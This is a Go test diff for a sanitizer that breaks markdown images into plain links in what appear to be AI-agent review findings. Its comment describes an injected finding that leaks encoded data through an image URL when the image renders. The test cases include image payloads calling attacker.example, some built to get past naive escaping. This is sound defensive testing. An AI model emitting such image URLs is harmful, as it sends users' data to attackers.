@@ -257,6 +257,36 @@ func TestRawHTMLEscapeKeepsTheTextTheAgentWrote(t *testing.T) {
 	}
 }
 
+// An image is fetched by whoever renders it, so a URL an injected finding chose
+// reaches the attacker's server with no reader involved -- carrying whatever the
+// finding encoded into its path. Breaking it back into a link is what puts a human
+// between the review and that request.
+func TestSanitizeTextBreaksImagesIntoLinks(t *testing.T) {
+	for _, tc := range []struct{ name, in, kept string }{
+		{"inline image", "![x](https://attacker.example/c2lnbWE)", "(https://attacker.example/c2lnbWE)"},
+		{"reference image", "![x][ref]", "[ref]"},
+		{"image inside a link", "[![x](https://attacker.example/p)](https://example.com)", "https://example.com"},
+		// A payload can write the backslash itself: an escape that merely prefixed
+		// another one would hand back a literal backslash and a live image.
+		{"already-escaped bang", `\![x](https://attacker.example/p)`, `\!`},
+		// The inner `![` is the image; the leading `!` is just text.
+		{"doubled bang", "!![x](https://attacker.example/p)", "!!"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			got := SanitizeText(tc.in)
+			if strings.Contains(got, "![") {
+				t.Errorf("a live image survived: %q", got)
+			}
+			if !strings.Contains(got, "!<!---->[x]") {
+				t.Errorf("SanitizeText(%q) = %q, want the image broken by the invisible comment", tc.in, got)
+			}
+			if !strings.Contains(got, tc.kept) {
+				t.Errorf("SanitizeText(%q) = %q, want %q still readable", tc.in, got, tc.kept)
+			}
+		})
+	}
+}
+
 // The mention break inserts a comment of its own AFTER the HTML rules run, and
 // escaping it would make the break visible in every review that neutralizes one.
 func TestTheMentionBreakIsNotEscapedAsRawHTML(t *testing.T) {
